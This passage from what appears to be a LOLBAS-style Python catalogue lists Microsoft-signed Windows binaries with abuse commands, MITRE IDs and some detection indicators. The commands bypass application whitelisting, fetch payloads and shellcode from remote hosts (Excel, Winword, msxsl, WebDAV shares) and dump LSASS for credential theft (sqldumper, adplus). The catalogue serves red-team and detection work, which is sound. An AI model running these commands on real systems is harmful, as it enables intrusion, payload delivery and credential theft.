                    "Command": "bginfo.exe bginfo.bgi /popup /nolicprompt",
                    "Description": "Execute VBscript code that is referenced within the bginfo.bgi file.",
                    "Usecase": "Local execution of VBScript",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt",
                    "Usecase": "Remote execution of VBScript",
                    "Description": "Execute bginfo.exe from a WebDAV server.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt",
                    "Usecase": "Remote execution of VBScript",
                    "Description": "Execute bginfo.exe from a WebDAV server.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt",
                    "Usecase": "Remote execution of VBScript",
                    "Description": "This style of execution may not longer work due to patch.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt",
                    "Usecase": "Remote execution of VBScript",
                    "Description": "This style of execution may not longer work due to patch.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [{"Path": "No fixed path"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "bginfo",
        },
        {
            "Name": "coregen.exe",
            "Description": 'Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.',
            "Author": "Martin Sohn Christensen",
            "Created": datetime.date(2020, 10, 9),
            "Commands": [
                {
                    "Command": "coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name",
                    "Description": "Loads the target .DLL in arbitrary path specified with /L.",
                    "Usecase": "Execute DLL code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1055",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1055",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "coregen.exe dummy_assembly_name",
                    "Description": "Loads the coreclr.dll in the corgen.exe directory (e.g. C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0).",
                    "Usecase": "Execute DLL code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1055",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1055",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name",
                    "Description": "Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.",
                    "Usecase": "Execute DLL code",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": 'coregen.exe loading .dll file not in "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\"'
                },
                {"IOC": "coregen.exe loading .dll file not named coreclr.dll"},
                {"IOC": "coregen.exe command line containing -L or -l"},
                {
                    "IOC": "coregen.exe command line containing unexpected/invald assembly name"
                },
                {"IOC": "coregen.exe application crash by invalid assembly name"},
            ],
            "Resources": [
                {"Link": "https://www.youtube.com/watch?v=75XImxOOInU"},
                {
                    "Link": "https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html"
                },
            ],
            "Acknowledgement": [
                {"Person": "Nicky Tyrer", "Handle": None},
                {"Person": "Evan Pena", "Handle": None},
                {"Person": "Casey Erikson", "Handle": None},
            ],
            "pname": "coregen",
        },
        {
            "Name": "Winword.exe",
            "Description": "Microsoft Office binary",
            "Author": "Reegun J (OCBC Bank)",
            "Created": "2019-07-19",
            "Commands": [
                {
                    "Command": 'winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"',
                    "Description": "Downloads payload from remote server",
                    "Usecase": "It will download a remote payload and place it in the cache folder",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office16\\winword.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office15\\winword.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office15\\winword.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\winword.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office14\\winword.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office14\\winword.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\winword.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\winword.exe"},
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\winword.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/reegun21/status/1150032506504151040"},
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
                },
            ],
            "Acknowledgement": [
                {"Person": "Reegun J (OCBC Bank)", "Handle": "AT_SYMBOLreegun21"}
            ],
            "pname": "winword",
        },
        {
            "Name": "DefaultPack.EXE",
            "Description": "This binary can be downloaded along side multiple software downloads on the microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
            "Author": "AT_SYMBOLcheckymander",
            "Created": "2020-10-01",
            "Commands": [
                {
                    "Command": 'DefaultPack.EXE /C:"process.exe args"',
                    "Description": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.",
                    "Usecase": "Can be used to execute stagers, binaries, and other malicious commands.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Program Files (x86)\\Microsoft\\DefaultPack\\"}
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "DefaultPack.EXE spawned an unknown process"}],
            "Resources": [
                {"Link": "https://twitter.com/checkymander/status/1311509470275604480."}
            ],
            "Acknowledgement": [
                {"Person": "checkymander", "Handle": "AT_SYMBOLcheckymander"}
            ],
            "pname": "defaultpack",
        },
        {
            "Name": "Devtoolslauncher.exe",
            "Description": "Binary will execute specified binary. Part of VS/VScode installation.",
            "Author": "felamos",
            "Created": "2019-10-04",
            "Commands": [
                {
                    "Command": 'devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test',
                    "Description": "The above binary will execute other binary.",
                    "Usecase": "Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with VS/VScode installed",
                },
                {
                    "Command": 'devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] "argument here" test',
                    "Description": "The above binary will execute other binary.",
                    "Usecase": "Execute any binary with given arguments.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with VS/VScode installed",
                },
            ],
            "Full_Path": [{"Path": "c:\\windows\\system32\\devtoolslauncher.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "DeveloperToolsSvc.exe spawned an unknown process"}],
            "Resources": [
                {"Link": "https://twitter.com/_felamos/status/1179811992841797632"}
            ],
            "Acknowledgement": [{"Person": "felamos", "Handle": "AT_SYMBOL_felamos"}],
            "pname": "devtoolslauncher",
        },
        {
            "Name": "csi.exe",
            "Description": "Command line interface included with Visual Studio.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "csi.exe file",
                    "Description": "Use csi.exe to run unsigned C# code.",
                    "Usecase": "Local execution of unsigned C# code.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "c:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\MSBuild\\15.0\\Bin\\Roslyn\\csi.exe"
                },
                {
                    "Path": "c:\\Program Files (x86)\\Microsoft Web Tools\\Packages\\Microsoft.Net.Compilers.X.Y.Z\\tools\\csi.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/subTee/status/781208810723549188"},
                {
                    "Link": "https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "csi",
        },
        {
            "Name": "Mftrace.exe",
            "Description": "Trace log generation tool for Media Foundation Tools.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Mftrace.exe cmd.exe",
                    "Description": "Launch cmd.exe as a subprocess of Mftrace.exe.",
                    "Usecase": "Local execution of cmd.exe as a subprocess of Mftrace.exe.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "Mftrace.exe powershell.exe",
                    "Description": "Launch cmd.exe as a subprocess of Mftrace.exe.",
                    "Usecase": "Local execution of powershell.exe as a subprocess of Mftrace.exe.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x86"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x64"
                },
                {"Path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x86"},
                {"Path": "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/0rbz_/status/988911181422186496"}
            ],
            "Acknowledgement": [{"Person": "fabrizio", "Handle": "AT_SYMBOL0rbz_"}],
            "pname": "mftrace",
        },
        {
            "Name": "Sqldumper.exe",
            "Description": "Debugging utility included with Microsoft SQL.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "sqldumper.exe 464 0 0x0110",
                    "Description": "Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).",
                    "Usecase": "Dump process using PID.",
                    "Category": "Dump",
                    "Privileges": "Administrator",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "sqldumper.exe 540 0 0x01100:40",
                    "Description": "0x01100:40 flag will create a Mimikatz compatible dump file.",
                    "Usecase": "Dump LSASS.exe to Mimikatz compatible dump using PID.",
                    "Category": "Dump",
                    "Privileges": "Administrator",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesX86\\Microsoft Analysis\\AS OLEDB\\140\\SQLDumper.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/countuponsec/status/910969424215232518"},
                {"Link": "https://twitter.com/countuponsec/status/910977826853068800"},
                {
                    "Link": "https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se"
                },
            ],
            "Acknowledgement": [
                {"Person": "Luis Rocha", "Handle": "AT_SYMBOLcountuponsec"}
            ],
            "pname": "sqldumper",
        },
        {
            "Name": "msxsl.exe",
            "Description": "Command line utility used to perform XSL transformations.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "msxsl.exe customers.xml script.xsl",
                    "Description": "Run COM Scriptlet code within the script.xsl file (local).",
                    "Usecase": "Local execution of script stored in XSL file.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "msxsl.exe customers.xml script.xsl",
                    "Description": "Run COM Scriptlet code within the script.xsl file (local).",
                    "Usecase": "Local execution of script stored in XSL file.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml",
                    "Description": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).",
                    "Usecase": "Local execution of remote script stored in XSL script stored as an XML file.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml",
                    "Description": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).",
                    "Usecase": "Local execution of remote script stored in XSL script stored as an XML file.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [{"Path": None}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/subTee/status/877616321747271680"},
                {"Link": "https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker"},
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "msxsl",
        },
        {
            "Name": "Excel.exe",
            "Description": "Microsoft Office binary",
            "Author": "Reegun J (OCBC Bank)",
            "Created": "2019-07-19",
            "Commands": [
                {
                    "Command": "Excel.exe http://192.168.1.10/TeamsAddinLoader.dll",
                    "Description": "Downloads payload from remote server",
                    "Usecase": "It will download a remote payload and place it in the cache folder",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office16\\Excel.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office16\\Excel.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office15\\Excel.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office15\\Excel.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Excel.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office14\\Excel.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office14\\Excel.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\Excel.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe"},
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/reegun21/status/1150032506504151040"},
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
                },
            ],
            "Acknowledgement": [
                {"Person": "Reegun J (OCBC Bank)", "Handle": "AT_SYMBOLreegun21"}
            ],
            "pname": "excel",
        },
        {
            "Name": "Remote.exe",
            "Description": "Debugging tool included with Windows Debugging Tools",
            "Author": "mr.d0x",
            "Created": "1/6/2021",
            "Commands": [
                {
                    "Command": 'Remote.exe /s "powershell.exe" anythinghere',
                    "Description": "Spawns powershell as a child process of remote.exe",
                    "Usecase": "Executes a process under a trusted Microsoft signed binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": None,
                    "MitreLink": None,
                    "OperatingSystem": None,
                },
                {
                    "Command": 'Remote.exe /s "powershell.exe" anythinghere',
                    "Description": "Spawns powershell as a child process of remote.exe",
                    "Usecase": "Executes a process under a trusted Microsoft signed binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": None,
                    "MitreLink": None,
                    "OperatingSystem": None,
                },
                {
                    "Command": 'Remote.exe /s "\\\\10.10.10.30\\binaries\\file.exe" anythinghere',
                    "Description": "Run a remote file",
                    "Usecase": "Executing a remote binary without saving file to disk",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": None,
                    "MitreLink": None,
                    "OperatingSystem": None,
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\remote.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "remote.exe spawned"}],
            "Resources": [
                {
                    "Link": "https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/"
                }
            ],
            "Acknowledgement": [{"Person": "mr.d0x", "Handle": "AT_SYMBOLmrd0x"}],
            "pname": "remote",
        },
        {
            "Name": "Msdeploy.exe",
            "Description": "Microsoft tool used to deploy Web Applications.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\\temp\\calc.bat"',
                    "Description": "Launch calc.bat via msdeploy.exe.",
                    "Usecase": "Local execution of batch file using msdeploy.exe.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows server",
                },
                {
                    "Command": 'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\\temp\\calc.bat"',
                    "Description": "Launch calc.bat via msdeploy.exe.",
                    "Usecase": "Local execution of batch file using msdeploy.exe.",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows server",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe"
                }
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/995837734379032576"},
                {"Link": "https://twitter.com/pabraeken/status/999090532839313408"},
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "msdeploy",
        },
        {
            "Name": "SQLToolsPS.exe",
            "Description": "Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "SQLToolsPS.exe -noprofile -command Start-Process calc.exe",
                    "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
                    "Usecase": "Execute PowerShell command.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe"
                }
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/993298228840992768"},
                {
                    "Link": "https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017"
                },
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "sqltoolsps",
        },
        {
            "Name": "Squirrel.exe",
            "Description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
            "Author": "Reegun J (OCBC Bank) - AT_SYMBOLreegun21",
            "Created": "2019-06-26",
            "Commands": [
                {
                    "Command": "squirrel.exe --download [url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file and download the nuget package.",
                    "Usecase": "Download binary",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "squirrel.exe --update [url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "squirrel.exe --update [url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "squirrel.exe --updateRoolback=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "squirrel.exe --updateRollback=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
            ],
            "Full_Path": [
                {"Path": "%localappdata%\\Microsoft\\Teams\\current\\Squirrel.exe"}
            ],
            "Code_Sample": [
                {"Code": "https://github.com/jreegun/POC-s/tree/master/nuget-squirrel"}
            ],
            "Detection": [{"IOC": "Update.exe spawned an unknown process"}],
            "Resources": [
                {"Link": "https://www.youtube.com/watch?v=rOP3hnkj7ls"},
                {"Link": "https://twitter.com/reegun21/status/1144182772623269889"},
                {
                    "Link": "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
                },
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12"
                },
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56"
                },
            ],
            "Acknowledgement": [
                {"Person": "Reegun J (OCBC Bank)", "Handle": "AT_SYMBOLreegun21"},
                {"Person": "Adam", "Handle": "AT_SYMBOLHexacorn"},
            ],
            "pname": "squirrel",
        },
        {
            "Name": "adplus.exe",
            "Description": "Debugging tool included with Windows Debugging Tools",
            "Author": "mr.d0x",
            "Created": "1/9/2021",
            "Commands": [
                {
                    "Command": "adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet",
                    "Description": "Creates a memory dump of the lsass process",
                    "Usecase": "Create memory dump and parse it offline",
                    "Category": "Dump",
                    "Privileges": "SYSTEM",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/techniques/T1003/",
                    "OperatingSystem": "All Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/"
                }
            ],
            "Acknowledgement": [{"Person": "mr.d0x", "Handle": "AT_SYMBOLmrd0x"}],
            "pname": "adplus",
        },
        {
            "Name": "te.exe",
            "Description": "Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "te.exe bypass.wsc",
                    "Description": "Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.",
                    "Usecase": "Execute Visual Basic script stored in local Windows Script Component file.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [{"Path": None}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://twitter.com/gn3mes1s/status/927680266390384640?lang=bg"
                }
            ],
            "Acknowledgement": [
                {"Person": "Giuseppe N3mes1s", "Handle": "AT_SYMBOLgN3mes1s"}
            ],
            "pname": "te",
        },
        {
            "Name": "Powerpnt.exe",
            "Description": "Microsoft Office binary.",
            "Author": "Reegun J (OCBC Bank)",
            "Created": "2019-07-19",
            "Commands": [
                {
                    "Command": 'Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"',
